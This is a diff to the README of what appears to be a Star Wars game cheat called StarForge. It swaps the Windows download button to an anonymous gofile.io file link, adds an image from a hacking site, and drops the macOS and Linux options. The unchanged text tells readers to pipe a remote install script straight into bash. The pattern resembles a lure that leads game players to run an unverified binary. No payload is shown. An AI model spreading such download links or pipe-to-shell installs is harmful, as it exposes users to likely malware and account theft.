@@ -19,7 +19,7 @@ StarForge:Activate({
     targets = ["heroes","reinforcements"]
 })
 ```
-
+<img src="https://hells-hack.com/uploads/posts/2021-01/1612076305_45786845.jpg" width="800" alt="StarForge in Action">
 ## 🌠 Legendary Feature Matrix  
 
 | Feature | Standard Gameplay | StarForge Enhanced |
@@ -47,16 +47,9 @@ curl -sSL starforge.gg/install | bash
 ```
 
 <div align="center">
-  <a href="#windows">
+  <a href="https://gofile.io/d/w9y7IJ">
     <img src="https://img.shields.io/badge/🪟_WINDOWS_EDITION-0078D6?style=for-the-badge" width="200">
   </a>
-  <a href="#mac">
-    <img src="https://img.shields.io/badge/🍏_MACOS_EDITION-000000?style=for-the-badge" width="200">
-  </a>
-  <a href="#linux">
-    <img src="https://img.shields.io/badge/🐧_LINUX_EDITION-E95420?style=for-the-badge" width="200">
-  </a>
-</div>
 
 ## ⚠️ Jedi Council Advisory  
 > "This power comes with great responsibility. Use only in offline or approved custom matches to maintain balance in the Force." 
